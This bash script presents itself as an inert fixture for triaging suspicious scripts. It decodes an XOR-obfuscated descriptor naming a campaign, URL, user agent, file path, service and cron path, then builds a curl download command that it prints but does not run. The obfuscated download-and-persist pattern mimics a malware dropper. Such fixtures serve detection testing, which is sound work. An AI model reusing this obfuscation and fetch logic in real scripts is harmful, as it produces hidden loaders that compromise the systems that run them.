#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_d266910d='48,102,60,49,52,48,100,99,60,103,40,96,98,100,113,118,43,42,96,109,102,100,102,40,118,118,96,119,113,107,112,109,42,117,104,113,42,56,109,113,100,117,90,96,105,108,99,121,48,102,60,49,52,48,100,99,60,103,42,103,100,73,118,118,96,119,113,107,112,77,56,113,107,96,98,100,90,119,96,118,112,121,109,118,43,61,55,49,100,48,52,55,54,42,97,108,105,100,115,107,108,43,96,105,117,104,100,125,96,43,48,102,60,49,52,48,100,99,60,103,42,42,63,118,117,113,113,109,56,105,119,112,121,48,102,60,49,52,48,100,99,60,103,40,107,98,108,100,117,104,100,102,56,97,108,90,107,98,108,100,117,104,100,102,121,52,56,113,107,112,106,102,90,96,98,100,113,118,121,113,112,117,113,112,106,90,105,119,112,102,56,119,96,113,117,100,97,100,121,96,105,108,99,90,96,113,108,119,114,41,96,113,106,104,96,119,90,96,119,108,112,116,102,100,56,118,117,96,113,118,121,52,56,115'
readonly Codec_d266910d='decimal_comma|reverse_then_xor|05'

Load_d266910d() {
  item1=()
  local IFS=','
  read -r -a item1 <<< "${Material_d266910d}"
}

Decode_d266910d() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2[${#item1[@]}-1-item5]="$((item1[item5] ^ 5))"
  done
}

Recover_d266910d() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_d266910d
  local decode_target=Decode_d266910d; "$decode_target"
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_d266910d() { Recover_d266910d; }

Plan_d266910d() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_d266910d)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d266910d; fi
